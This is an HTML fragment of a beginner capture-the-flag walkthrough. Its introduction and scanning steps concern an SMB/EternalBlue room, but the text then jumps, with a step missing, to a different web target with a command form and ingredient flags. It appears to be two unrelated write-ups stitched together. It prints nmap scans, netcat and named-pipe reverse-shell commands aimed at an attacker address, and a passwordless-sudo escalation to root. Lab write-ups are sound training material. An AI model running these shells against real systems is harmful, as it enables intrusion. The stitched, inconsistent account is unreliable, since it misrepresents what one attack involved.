            <section id="introduction">
                <h2>Introduction</h2>
                <p>Nearly every write-up I could find on this room followed the steps exactly, i.e. ran the commands given in the room guidance, primarily running Metasploit modules. I also searched online, where I found some more interesting manual approaches. I have taken bits and pieces from these walkthroughs, plus added a little of my own ideas, such as using Mimikatz to extract the password hashes. Hopefully, this write-up will be useful to individuals wanting to approach the challenge a little differently and without the help of Metasploit (although I do use msfvenom for my payload).</p>

                <h2>Objective</h2>
                <p>Gain access, dump the stored SAM passwords, crack the hash and find the flags.</p>

                <h2>Step One - Enumeration</h2>
                <p>Perform a basic network mapper scan. We do not need DNS resolution (-n), let's perform a TCP SYN scan (-sS, a little bit stealthier), and output to an xml file (-oX).</p>
                <pre><code>case@local:~$ nmap -n -v -sS -oX blue_output.xml 10.10.34.160</code></pre>
                <p>Here is a truncated snapshot of our scan output.</p>

                <p>There is some useful stuff here. 445 (SMB) is definitely going to be our attack point, the room is called "Blue" and the preceeding learning modules have been almost exclusively referring to the EternalBlue exploit (MS17-010). Let us confirm our suspicions and run the nmap "vuln" scripts against port 445.</p>
                <pre><code>case@local:~$ nmap -n -v --script=vuln -p 445 -oX blue_script_vulns.xml 10.10.34.160</code></pre>

                <h2>Step Three - A Reverse Shell</h2>
                <p>We now have an active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
                <img src="pickle_form.png" alt="not_found.png">
                <p>We effectively have a web shell. "whoami" is showing we are currently logged in as "www-data". This is good. However, "www-data" is commonly the user created when the web server software is installed and therefore is, typically, a low-privileged user created specifically for running web server processes. I wonder if we can submit the form with a command to open a network connection and execute a shell? Let us try with netcat. First we need a listener on our local/attacking machine.. </p>
                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
                <p>Now submit the command..</p>
                <pre><code>nc attacking_ip_address 444 -e /bin/bash</code></pre>
                <p>It did not work....</p>
                <img src="sad_morty.jpeg" alt="not_found.png">
                <p>Maybe it just does not like the attempt to execute the shell; in many systems, especially on newer versions of netcat (like netcat-openbsd), the -e option (which allows execution of commands) is disabled by default due to security concerns, as it can be used for malicious purposes (like reverse shells!!). So let us see if we can simply submit the command...</p>
                <pre><code>nc attacking_ip_address 444</code></pre>
                <p>It worked!!</p>
                <pre><code>case@local:~$ sudo nc -lvnp 444
[sudo] password for case:
Listening on 0.0.0.0 444
Connection received on 10.10.236.162 37146
                </code></pre>
                <p>Okay, so we can successfully execute a netcat command but we cannot use the "-e" option, which allows us to execute an external program after making the connection. Well, let's just do it manually instead, by creating a named pipe and redirecting stdin, stdout and stderr...</p>
                <pre><code>mkfifo /tmp/f; nc attacking_ip_address 444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f</code></pre>
                <p>We now have a reverse shell..</p>
                <pre><code>case@local:~$ sudo nc -lvnp 444
[sudo] password for case:
Listening on 0.0.0.0 444
Connection received on 10.10.236.162 37260
whoami
www-data
                </code></pre>
                <p>This is a bit clunky however, it doesn't give us a fully-fledged terminal environment. Let us see if we can spawn a pseudo-terminal using Python, to more accurately simulate a real terminal session; we know we are on a Linux box, Python3 is likely installed, let us give it a go...</p>
                <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
                <p>It worked a treat...</p>
                <pre><code>www-data@ip-10-10-236-162:/var/www/html$</code></pre>
                <p>Let us set the TERM environment variable also, let us set it to "xterm", this will ensure our pseudo terminal behaves correctly, and ensures compatibility with features such as screen clearing..</p>
                <pre><code>export TERM=xterm</code></pre>

            <section id="Four">
                <h2>Step Four - Privilege Escalation</h2>
                <p>Okay, so we have a stable/interactive reverse shell. We still only have "www-data" privileges. Let see what this user can do with "sudo". Using the command "sudo -l" we get the following output:</p>
                <pre><code>User www-data may run the following commands on ip-10-10-236-162:
    (ALL) NOPASSWD: ALL
                </code></pre>
                <p>This is now effectively game over. This is telling us that our current logged in user can execute commands as any user, that no password is required to do so, and that we can run any command. We can simply escalate to root now by executing "sudo /bin/bash". We are now root!</p>
                <pre><code>root@ip-10-10-236-162:/var/www/html#</code></pre>

            <section id="solution">
                <h2>Solution</h2>
                <p>First flag is here:</p>
                <pre><code>root@ip-10-10-236-162:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt</code></pre>
                <p>The second flag is here:</p>
                <pre><code>root@ip-10-10-236-162:/home/rick# cat 'second ingredients'</code></pre>
                <p>The final flag I found in this file here:</p>
                <pre><code>root@ip-10-10-236-162:/home/ubuntu# nano .bash_history</code></pre>

            <section id="conclusion">
                <h2>Conclusion</h2>
                <p>This was fairly straight forward and should not give you any trouble. It is the first CTF in the Complete Beginner path so although it was fairly easy it was very useful in applying the techniques taught in the path up to this point. The key is to enumerate thoroughly first, carefully consider what you know about your target and tailor your attack based on what you know.</p>
